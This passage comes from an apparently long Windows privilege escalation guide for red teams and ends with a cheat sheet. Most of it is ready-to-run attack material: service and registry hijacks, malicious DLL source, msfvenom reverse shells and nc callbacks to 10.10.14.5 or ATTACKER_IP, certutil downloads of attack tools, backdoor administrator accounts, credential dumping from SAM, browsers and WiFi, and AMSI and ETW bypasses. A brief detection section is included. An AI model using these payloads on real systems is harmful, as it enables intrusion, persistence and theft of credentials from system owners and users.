**Exploitation:**

```batch
:: Backup original binary
copy "C:\Program Files\VulnerableApp\service.exe" "C:\temp\service.exe.bak"

:: Replace with malicious binary
copy /Y payload.exe "C:\Program Files\VulnerableApp\service.exe"

:: Restart service
sc stop "VulnerableService"
sc start "VulnerableService"
```

### 3.1.5 Weak Service Registry Permissions

The service configuration in the registry may be modifiable even if the service DACL is secure.

**Detection:**

```batch
:: Check registry permissions
accesschk.exe /accepteula -kvuqsw "Authenticated Users" hklm\System\CurrentControlSet\Services
accesschk.exe /accepteula -kvuqsw "Users" hklm\System\CurrentControlSet\Services
```

```powershell
# Check specific service registry permissions
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
foreach ($service in $services) {
    $acl = Get-Acl $service.PSPath
    foreach ($ace in $acl.Access) {
        if ($ace.RegistryRights -match 'FullControl|SetValue' -and 
            $ace.IdentityReference -match 'Users|Everyone|Authenticated') {
            Write-Host "[VULN] $($service.PSChildName)" -ForegroundColor Red
            Write-Host "       Modifiable by: $($ace.IdentityReference)" -ForegroundColor Yellow
        }
    }
}
```

**Exploitation:**

```powershell
# Modify ImagePath
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name "ImagePath" -Value "C:\temp\payload.exe"

# Restart service
Restart-Service "VulnerableService"
```

## 3.2 DLL Hijacking

DLL hijacking exploits Windows' DLL search order to load malicious libraries instead of legitimate ones.

### 3.2.1 Windows DLL Search Order

When an application loads a DLL without specifying the full path, Windows searches in this order:

1. **Known DLLs**: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`
2. **Application directory**: Directory containing the executable
3. **System directory**: `C:\Windows\System32`
4. **16-bit system directory**: `C:\Windows\System`
5. **Windows directory**: `C:\Windows`
6. **Current directory**: Process's current working directory
7. **PATH directories**: Directories in the PATH environment variable

**Safe DLL Search Mode (default enabled):**
When enabled, the current directory is searched after system directories.

### 3.2.2 Finding DLL Hijacking Opportunities

**Using Process Monitor (Procmon):**

```
1. Launch Procmon as Administrator
2. Set filters:
   - Operation is CreateFile
   - Result is NAME NOT FOUND
   - Path ends with .dll
3. Run target application
4. Analyze missing DLLs in writable locations
```

**Automated Detection Script:**

```powershell
# Find applications loading DLLs from writable locations
function Find-DLLHijack {
    param([string]$ProcessName)
    
    # Get process info
    $proc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if (!$proc) {
        Write-Host "Process not found" -ForegroundColor Red
        return
    }
    
    # Get loaded modules
    $modules = $proc.Modules
    
    foreach ($module in $modules) {
        $path = $module.FileName
        $dir = Split-Path $path -Parent
        
        # Check if directory is writable
        try {
            $acl = Get-Acl $dir
            foreach ($ace in $acl.Access) {
                if ($ace.FileSystemRights -match 'Write|FullControl|Modify' -and 
                    $ace.IdentityReference -match 'Users|Everyone|Authenticated') {
                    Write-Host "[VULN] $path" -ForegroundColor Red
                    Write-Host "       Directory writable by: $($ace.IdentityReference)" -ForegroundColor Yellow
                }
            }
        } catch {}
    }
}
```

### 3.2.3 Phantom DLL Hijacking

Some applications attempt to load DLLs that don't exist on the system. If the search path includes a writable directory, an attacker can plant a malicious DLL.

**Common Phantom DLLs:**

| Application | Missing DLL | Write Location |
|-------------|-------------|----------------|
| Many .NET apps | CRYPTSP.dll, CRYPTBASE.dll | Application directory |
| Office applications | Various plugin DLLs | AppData directories |
| Custom applications | Application-specific | Application directory |

**Creating Malicious DLL:**

```c
// dllmain.cpp - Minimal DLL payload
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Execute payload once when DLL is loaded
        system("cmd.exe /c net localgroup administrators YOUR_USER /add");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

**Compiling with Visual Studio:**

```batch
cl.exe /LD /Fe:malicious.dll dllmain.cpp
```

**Using msfvenom:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f dll -o malicious.dll
```

### 3.2.4 DLL Proxying/Sideloading

DLL proxying creates a malicious DLL that forwards legitimate function calls to the original DLL while executing malicious code.

**Steps:**
1. Identify target DLL and its exports
2. Create proxy DLL that exports same functions
3. Proxy forwards calls to renamed original DLL
4. Inject payload in DllMain

**Using SharpDLLProxy:**

```batch
:: Generate proxy DLL
SharpDLLProxy.exe --dll C:\Windows\System32\version.dll --output-dir C:\temp\proxy
```

## 3.3 Registry Exploits

### 3.3.1 AlwaysInstallElevated

When enabled, MSI packages install with SYSTEM privileges regardless of the user running them.

**Detection:**

```batch
:: Check both registry keys (both must be set to 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell check
$hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
$hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue

if ($hkcu.AlwaysInstallElevated -eq 1 -and $hklm.AlwaysInstallElevated -eq 1) {
    Write-Host "[VULN] AlwaysInstallElevated is enabled!" -ForegroundColor Red
}
```

**Exploitation:**

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o evil.msi
```

```batch
:: Install MSI silently
msiexec /quiet /qn /i evil.msi
```

### 3.3.2 Autorun Registry Keys

**Common Autorun Locations:**

| Registry Key | Run Context |
|--------------|-------------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user logon |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Current user (once) |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | All users logon |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` | All users (once) |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices` | Service startup |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup` | Startup folder path |

**Detection:**

```powershell
# Check for writable autorun entries
$autorunPaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($path in $autorunPaths) {
    if (Test-Path $path) {
        $props = Get-ItemProperty $path
        $props.PSObject.Properties | Where-Object {$_.Name -notmatch '^PS'} | ForEach-Object {
            $target = $_.Value -replace '"', ''
            if (Test-Path $target) {
                $acl = Get-Acl $target
                foreach ($ace in $acl.Access) {
                    if ($ace.FileSystemRights -match 'Write|FullControl|Modify') {
                        Write-Host "[VULN] $($_.Name): $target" -ForegroundColor Red
                    }
                }
            }
        }
    }
}
```

**Exploitation:**

```powershell
# Add malicious autorun entry
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\temp\payload.exe"

# Or modify existing writable binary
# (replace legitimate autorun binary with payload)
```

### 3.3.3 Startup Folder Exploitation

**Startup Folder Locations:**

| Location | Affects |
|----------|---------|
| `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` | Single user |
| `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` | All users |

**Detection:**

```powershell
# Check startup folders
$startupPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)

foreach ($path in $startupPaths) {
    Write-Host "`nChecking: $path" -ForegroundColor Cyan
    $acl = Get-Acl $path
    $acl.Access | Where-Object {$_.FileSystemRights -match 'Write|FullControl|Modify'} | 
        ForEach-Object { Write-Host "  Writable by: $($_.IdentityReference)" -ForegroundColor Yellow }
}
```

**Exploitation:**

```batch
:: Place payload in startup folder
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

---

# IV. Credential Harvesting & Secrets

## 4.1 File-Based Credential Discovery

### 4.1.1 Common Credential File Locations

**Configuration Files:**

| File Type | Common Locations | Content Type |
|-----------|------------------|--------------|
| web.config | `C:\inetpub\wwwroot\` | Database connection strings |
| appsettings.json | Application directories | API keys, credentials |
| .env files | Application roots | Environment variables |
| unattend.xml | `C:\Windows\Panther\` | Setup credentials |
| sysprep.xml | `C:\Windows\Panther\` | Admin password (base64) |
| .rdp files | User directories | Saved RDP credentials |
| .vnc files | User directories | VNC passwords |
| .config files | Application directories | Various credentials |

**Search Commands:**

```batch
:: Search for password in files
findstr /si password *.txt *.xml *.ini *.config *.cfg
findstr /spin "password" *.*
cd c:\Users\%USERNAME%\Documents & findstr /SI /M "password" *.xml *.ini *.txt

:: Search for specific file types
dir /s /b *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config
where /R C:\ *.config
where /R C:\ unattend.xml
where /R C:\ sysprep.xml
```

```powershell
# PowerShell comprehensive search
$searchTerms = @("password", "passwd", "pwd", "credentials", "secret", "api_key", "apikey", "connection")
$extensions = @("*.txt", "*.xml", "*.ini", "*.config", "*.cfg", "*.json", "*.ps1", "*.bat", "*.cmd")

foreach ($ext in $extensions) {
    Get-ChildItem -Path C:\ -Include $ext -Recurse -ErrorAction SilentlyContinue | 
        ForEach-Object {
            $content = Get-Content $_.FullName -ErrorAction SilentlyContinue
            foreach ($term in $searchTerms) {
                if ($content -match $term) {
                    Write-Host "[FOUND] $($_.FullName)" -ForegroundColor Green
                    $content | Select-String -Pattern $term | ForEach-Object { Write-Host "  $_" }
                }
            }
        }
}
```

### 4.1.2 Unattend.xml and Sysprep Credentials

**Common Locations:**
```
C:\unattend.xml
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Unattend\unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

**Extraction:**

```powershell
# Search for unattend files
Get-ChildItem C:\ -Recurse -Include unattend.xml,sysprep.xml,sysprep.inf -ErrorAction SilentlyContinue | 
    ForEach-Object {
        Write-Host "[FOUND] $($_.FullName)" -ForegroundColor Green
        $content = Get-Content $_.FullName
        # Look for password elements
        $content | Select-String -Pattern "Password|AdministratorPassword|AutoLogon" -Context 0,2
    }
```

**Decode Base64 Password:**

```powershell
# If password is base64 encoded
$encoded = "UABhAHMAcwB3AG8AcgBkADEAMgAzACEA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

### 4.1.3 IIS Web.config Files

```powershell
# Search for web.config files
Get-ChildItem -Path C:\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | 
    ForEach-Object {
        Write-Host "`n[FOUND] $($_.FullName)" -ForegroundColor Green
        $content = Get-Content $_.FullName
        
        # Extract connection strings
        $content | Select-String -Pattern "connectionString|password|pwd|user id|data source" | 
            ForEach-Object { Write-Host "  $_" }
    }
```

## 4.2 Windows Credential Manager

### 4.2.1 Cmdkey Enumeration

```batch
:: List stored credentials
cmdkey /list
```

**Output Analysis:**

```
Target: Domain:interactive=DOMAIN\Administrator
Type: Domain Password
User: DOMAIN\Administrator
```

**Credential Usage:**

```batch
:: Run command as stored user
runas /savecred /user:DOMAIN\Administrator cmd.exe

:: Use with saved credentials
runas /savecred /user:Administrator "cmd.exe /c whoami > C:\temp\whoami.txt"
```

### 4.2.2 Windows Vault

```powershell
# List vault credentials
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all

# Using PowerShell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
```

## 4.3 PowerShell Credential Storage

### 4.3.1 PowerShell History

```powershell
# Get history file path
(Get-PSReadLineOption).HistorySavePath

# Read history file
Get-Content (Get-PSReadLineOption).HistorySavePath

# Search for credentials in history
Get-Content (Get-PSReadLineOption).HistorySavePath | Select-String -Pattern "password|credential|secret"

# Alternative history location
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

### 4.3.2 PowerShell Secure Strings

```powershell
# Find XML credential files
Get-ChildItem -Path C:\Users -Include *.xml -Recurse -ErrorAction SilentlyContinue | 
    Where-Object { (Get-Content $_) -match "SecureString|PSCredential" }

# Decrypt SecureString (only works for same user)
$credential = Import-Clixml -Path "C:\scripts\cred.xml"
$credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().UserName
```

## 4.4 SAM and SYSTEM Registry Hives

### 4.4.1 Checking for Backup Files

```batch
:: Common backup locations
dir C:\Windows\Repair\SAM
dir C:\Windows\Repair\SYSTEM
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
```

### 4.4.2 Volume Shadow Copy Extraction

```powershell
# List shadow copies
vssadmin list shadows

# Access shadow copy
cmd /c "mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"

# Copy from shadow
copy C:\ShadowCopy\Windows\System32\config\SAM C:\temp\SAM
copy C:\ShadowCopy\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### 4.4.3 Registry Save Method (Requires Admin)

```batch
:: Save registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
```

### 4.4.4 Hash Extraction

```bash
# Using impacket-secretsdump (on attacker machine)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Using pypykatz
pypykatz registry --sam SAM --system SYSTEM
```

## 4.5 Browser Credential Extraction

### 4.5.1 Chrome Credentials

```powershell
# Chrome login data location
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Check for custom dictionary (may contain passwords)
Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Custom Dictionary.txt" | 
    Select-String -Pattern "password|pass"
```

**Using SharpChrome:**

```batch
.\SharpChrome.exe logins /unprotect
.\SharpChrome.exe cookies /unprotect
```

### 4.5.2 Firefox Credentials

```powershell
# Firefox profile location
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
Get-ChildItem $firefoxProfiles

# Key files
# logins.json - Encrypted login data
# key4.db - Encryption key database
```

### 4.5.3 LaZagne All-in-One

```batch
:: Run all credential recovery modules
.\lazagne.exe all

:: Specific browser
.\lazagne.exe browsers -chrome

:: Save output
.\lazagne.exe all > credentials.txt
```

## 4.6 WiFi Credentials

```batch
:: List saved WiFi profiles
netsh wlan show profiles

:: Show password for specific profile
netsh wlan show profile name="NetworkName" key=clear
```

```powershell
# Extract all WiFi passwords
(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $profile = ($_ -split ":")[1].Trim()
    $password = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content"
    if ($password) {
        Write-Host "$profile : $(($password -split ':')[1].Trim())"
    }
}
```

## 4.7 SessionGopher for Remote Access Tools

```powershell
# Import and run SessionGopher
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

# Target specific computer
Invoke-SessionGopher -Target COMPUTERNAME

# Supported tools:
# - PuTTY
# - WinSCP
# - FileZilla
# - SuperPuTTY
# - RDP
```

---

# V. Kernel & OS Vulnerabilities

## 5.1 Kernel Exploitation in 2025

### 5.1.1 Risk vs Reward Analysis

**Kernel Exploitation Considerations:**

| Factor | Consideration |
|--------|---------------|
| Stability | Kernel exploits can BSOD the system |
| Detection | Modern EDR monitors kernel behavior |
| Reliability | Exploits often version-specific |
| Necessity | Often not needed if other vectors exist |
| Client Impact | System crash = incident, potential data loss |

**When to Use Kernel Exploits:**
- All other vectors exhausted
- System is known vulnerable and stable exploit exists
- Test environment or explicit client authorization
- Virtual machine snapshots available

### 5.1.2 Vulnerability Research and Exploit Selection

**Step 1: Gather System Information**

```batch
systeminfo > systeminfo.txt
```

**Step 2: Use Windows Exploit Suggester**

```bash
# Update database
python windows-exploit-suggester.py --update

# Run analysis
python windows-exploit-suggester.py --database 2025-01-01-mssb.xls --systeminfo systeminfo.txt
```

**Step 3: Use Watson (On-Target)**

```batch
.\Watson.exe
```

### 5.1.3 Notable Windows Vulnerabilities (2019-2025)

**Legacy/High Detection (Educational):**

| CVE | Name | Affected | Notes |
|-----|------|----------|-------|
| CVE-2020-0796 | SMBGhost | Windows 10 1903/1909, Server 2019 | RCE via SMBv3 |
| CVE-2020-1472 | Zerologon | All DC versions | Domain compromise |
| CVE-2021-1675/34527 | PrintNightmare | All Windows | Print Spooler RCE |
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Windows 10 | SAM file access |
| CVE-2022-21999 | SpoolFool | Windows 10/11, Server | Print Spooler LPE |

**Modern Vulnerabilities (Check patch status):**

| CVE | Name | Affected | PrivEsc Type |
|-----|------|----------|--------------|
| CVE-2023-36802 | StreamingLocator | Windows 11 | MSKSSRV LPE |
| CVE-2024-21338 | AppLocker Bypass | Windows 10/11 | Driver LPE |
| CVE-2024-26169 | MsiExec Elevation | Windows 10/11 | MSI LPE |
| CVE-2024-30088 | Win32k | Windows 11 | Kernel LPE |

### 5.1.4 Safe Exploitation Practices

```powershell
# Pre-exploitation checks
# 1. Verify exact Windows version
[System.Environment]::OSVersion.Version
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild

# 2. Check if patch is installed
Get-HotFix | Where-Object {$_.HotFixID -eq "KBXXXXXXX"}

# 3. Verify system stability
Get-WmiObject Win32_OperatingSystem | Select-Object LastBootUpTime

# 4. Take note of current state
whoami /all > pre_exploit_state.txt
```

**Compilation Environment:**
- Use Visual Studio 2019/2022 matching target architecture
- Test exploits in isolated VMs first
- Keep original exploit source for reference
- Document any modifications made

---

# VI. Token Manipulation & Potato Attacks

## 6.1 Theory of Impersonation Privileges

### 6.1.1 Understanding Token Impersonation

Windows process tokens contain account security information. When a user authenticates, Windows creates a primary token containing:
- User SID
- Group SIDs
- Privileges
- Integrity level

**Impersonation** allows a thread to assume the security context of another user's token, commonly used by services handling client requests.

### 6.1.2 Key Privileges for Impersonation

| Privilege | Description | Common Holders |
|-----------|-------------|----------------|
| SeImpersonatePrivilege | Impersonate a client after authentication | IIS AppPool, SQL Server, service accounts |
| SeAssignPrimaryTokenPrivilege | Replace process-level token | Service accounts |

**Verification:**

```batch
whoami /priv | findstr "Impersonate\|AssignPrimaryToken"
```

### 6.1.3 Where These Privileges Appear

- **IIS Application Pools**: Web shells often have SeImpersonate
- **MSSQL with xp_cmdshell**: SQL service accounts
- **Scheduled tasks**: Tasks running as service accounts
- **Windows services**: Custom service accounts
- **Jenkins/CI systems**: Build agents

## 6.2 Evolution of Potato Attacks

### 6.2.1 Attack Family Timeline

| Year | Tool | Method | Windows Support |
|------|------|--------|-----------------|
| 2016 | Hot Potato | NBNS/WPAD | Legacy |
| 2016 | Rotten Potato | DCOM/NTLM | Legacy |
| 2018 | Juicy Potato | DCOM/CLSID | Pre-1809 |
| 2019 | Rogue Potato | Remote OXID | Server 2019 |
| 2020 | PrintSpoofer | Named Pipes | All modern |
| 2020 | Sweet Potato | Combo attack | All modern |
| 2021 | EfsPotato | EFS RPC | All modern |
| 2022 | LocalPotato | NTLM local relay | All modern |
| 2023 | GodPotato | Multiple methods | All modern |
| 2023 | CoercedPotato | Various coercion | All modern |

### 6.2.2 JuicyPotato (Legacy/Pre-Windows 10 1809)

**Status**: ❌ Blocked on Windows 10 1809+, Server 2019+

**Usage (Legacy Systems):**

```batch
:: Basic usage
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

:: With reverse shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe 10.10.14.5 443 -e cmd.exe" -t *

:: Common CLSIDs
:: BITS: {4991d34b-80a1-4291-83b6-3328366b9097}
:: WMI: {F3A614DC-ABE0-11d2-A441-00C04F795683}
```

### 6.2.3 PrintSpoofer (Modern Windows)

**Status**: ✅ Works on Windows 10/11, Server 2019/2022/2025

**Requirements**: SeImpersonatePrivilege enabled

```batch
:: Interactive SYSTEM shell
PrintSpoofer.exe -i -c cmd

:: Execute specific command
PrintSpoofer.exe -c "net user backdoor Password123! /add"

:: Reverse shell
PrintSpoofer.exe -c "c:\temp\nc.exe 10.10.14.5 443 -e cmd.exe"
```

### 6.2.4 GodPotato (Most Reliable 2023+)

**Status**: ✅ Works on all modern Windows versions

```batch
:: Basic SYSTEM shell
GodPotato.exe -cmd "cmd /c whoami"

:: Add user
GodPotato.exe -cmd "net user backdoor Password123! /add"
GodPotato.exe -cmd "net localgroup administrators backdoor /add"

:: Reverse shell
GodPotato.exe -cmd "c:\temp\nc.exe 10.10.14.5 443 -e cmd.exe"
```

### 6.2.5 RoguePotato

**Status**: ✅ Works on Windows Server 2019+

**Requires**: Remote OXID resolver (attacker-controlled)

**Setup (Attacker Machine):**

```bash
# Start OXID resolver
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
```

**Execution (Target):**

```batch
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c whoami > c:\temp\result.txt" -l 9999
```

### 6.2.6 EfsPotato

**Status**: ✅ Works by abusing Encrypting File System (EFS)

```batch
EfsPotato.exe "whoami"
EfsPotato.exe "net user backdoor Password123! /add"
```

### 6.2.7 LocalPotato (NTLM Local Relay)

**Status**: ✅ Unique approach using local NTLM relay

```batch
# Requires specific scenario - local SMB auth
LocalPotato.exe -i c:\temp\payload.exe
```

### 6.2.8 SweetPotato (Combined Approach)

**Status**: ✅ Combines multiple potato techniques

```batch
SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\result.txt"
```

## 6.3 Practical Potato Attack Workflow

### 6.3.1 MSSQL to SYSTEM Example

```bash
# Step 1: Connect to MSSQL
impacket-mssqlclient sql_dev@10.129.43.30 -windows-auth

# Step 2: Enable xp_cmdshell
SQL> enable_xp_cmdshell

# Step 3: Verify privileges
SQL> xp_cmdshell whoami /priv

# Step 4: Upload tool
SQL> xp_cmdshell certutil -urlcache -f http://10.10.14.5/GodPotato.exe c:\temp\GodPotato.exe

# Step 5: Execute
SQL> xp_cmdshell c:\temp\GodPotato.exe -cmd "cmd /c net localgroup administrators sql_dev /add"
```

### 6.3.2 IIS Web Shell to SYSTEM

```powershell
# From web shell, check privileges
whoami /priv

# If SeImpersonatePrivilege present, upload and execute
Invoke-WebRequest -Uri "http://10.10.14.5/PrintSpoofer.exe" -OutFile "C:\Windows\Temp\ps.exe"
C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe 10.10.14.5 443 -e cmd.exe"
```

---

# VII. Defense & OPSEC

## 7.1 Blue Team Perspective: Detection Points

### 7.1.1 Critical Event IDs

| Event ID | Log | Description | Detection Value |
|----------|-----|-------------|-----------------|
| 4688 | Security | Process creation | Command-line monitoring |
| 4689 | Security | Process termination | Process lifecycle |
| 4624 | Security | Successful logon | Authentication tracking |
| 4625 | Security | Failed logon | Brute force detection |
| 4672 | Security | Special privileges assigned | Privilege escalation indicator |
| 4673 | Security | Privileged service called | Sensitive operation monitoring |
| 4697 | Security | Service installed | Persistence detection |
| 4698 | Security | Scheduled task created | Persistence detection |
| 7045 | System | New service installed | Service creation |
| 1102 | Security | Audit log cleared | Anti-forensics detection |

### 7.1.2 Sysmon Events for Detection

| Sysmon Event | Description | PrivEsc Detection |
|--------------|-------------|-------------------|
| Event 1 | Process creation | Tool execution, suspicious commands |
| Event 3 | Network connection | C2 communications, data exfil |
| Event 6 | Driver loaded | Vulnerable driver loading |
| Event 7 | Image loaded (DLL) | DLL hijacking detection |
| Event 10 | Process access | LSASS access, injection |
| Event 11 | File created | Tool drops, payload creation |
| Event 12/13/14 | Registry events | Service modification, persistence |
| Event 17/18 | Named pipe events | Pipe-based attacks |
| Event 25 | Process tampering | AMSI/ETW bypass attempts |

### 7.1.3 Common Detection Signatures

**Service Binary Path Modification:**
```
Event 4657 (Registry modification) on:
HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath
```

**Suspicious Process Relationships:**
```
cmd.exe → net.exe (adding users)
services.exe → cmd.exe (service exploitation)
w3wp.exe → cmd.exe/powershell.exe (web shell)
sqlservr.exe → cmd.exe (xp_cmdshell)
```

**LSASS Access:**
```
Sysmon Event 10 with TargetImage: lsass.exe
Access mask: 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
```

## 7.2 OPSEC Considerations for Red Team

### 7.2.1 Tool OPSEC Ratings

| Tool | Detection Rate | OPSEC Recommendations |
|------|----------------|----------------------|
| WinPEAS | Very High | Never use on production |
| Mimikatz | Very High | Use only if necessary, custom compile |
| SharpUp | High | Obfuscate, rename |
| Rubeus | High | Custom compile, obfuscate |
| Manual commands | Low-Medium | Blend with legitimate admin activity |
| Living off the Land | Low | Preferred approach |

### 7.2.2 Evasion Techniques

**AMSI Bypass (2025 Working Methods):**

```powershell
# Memory patching (basic)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$mem)

# Reflection-based
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

**ETW Bypass:**

```powershell
# Patch ETW
$logProvider = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
# Requires process handle manipulation
```

**Parent PID Spoofing:**
- Use tools that support PPID spoofing
- Makes malicious processes appear to have legitimate parents

### 7.2.3 Operational Recommendations

1. **Time your activities**: Execute during business hours to blend with legitimate activity
2. **Use existing channels**: Leverage already-established connections
3. **Minimal footprint**: Avoid writing to disk when possible
4. **Clean up**: Remove tools and artifacts after use
5. **Log awareness**: Know what you're triggering and document for reporting
6. **Test detection**: Use isolated systems to verify tool detectability

---

# VIII. The Ultimate Cheat Sheet

## 8.1 Initial Enumeration Commands

### System Information

```batch
:: Basic info
systeminfo
hostname
whoami /all

:: Architecture
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture

:: Patches
wmic qfe list brief
```

```powershell
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
```

### User/Group Enumeration

```batch
:: Current user
whoami /priv
whoami /groups
net user %USERNAME%

:: All users
net user
net localgroup
net localgroup Administrators
net accounts
```

```powershell
Get-LocalUser | Select-Object Name, Enabled, Description
Get-LocalGroupMember -Group "Administrators"
```

### Network Enumeration

```batch
ipconfig /all
arp -a
route print
netstat -ano
netstat -ano | findstr LISTENING
```

### Process/Service Enumeration

```batch
tasklist /svc
sc query
wmic service get name,pathname,startmode | findstr /i "auto"
```

## 8.2 Service Exploitation Commands

### Unquoted Service Paths

```batch
:: Detection
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Exploitation (place binary in hijackable path)
copy payload.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnerableService
sc start VulnerableService
```

### Weak Service Permissions

```batch
:: Detection
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

:: Exploitation
sc config VulnerableService binpath= "cmd /c net localgroup administrators YOUR_USER /add"
sc stop VulnerableService
sc start VulnerableService
```

### Weak Binary Permissions

```batch
:: Detection
icacls "C:\Path\To\service.exe"
accesschk.exe /accepteula -quvw "C:\Path\To\service.exe"

:: Exploitation
copy /Y payload.exe "C:\Path\To\service.exe"
sc stop VulnerableService
sc start VulnerableService
```

## 8.3 Registry Exploitation

### AlwaysInstallElevated

```batch
:: Detection
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Exploitation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## 8.4 Credential Harvesting

### File Searches

```batch
:: Password in files
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

:: Specific files
dir /s /b unattend.xml sysprep.xml web.config
where /R C:\ *.config
```

### Windows Credentials

```batch
:: Credential Manager
cmdkey /list

:: WiFi
netsh wlan show profiles
netsh wlan show profile name="ProfileName" key=clear

:: Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### PowerShell History

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

### SAM/SYSTEM Extraction

```batch
:: If admin
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

## 8.5 Privilege Abuse

### SeImpersonatePrivilege

```batch
:: PrintSpoofer
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.14.5 443 -e cmd.exe"

:: GodPotato
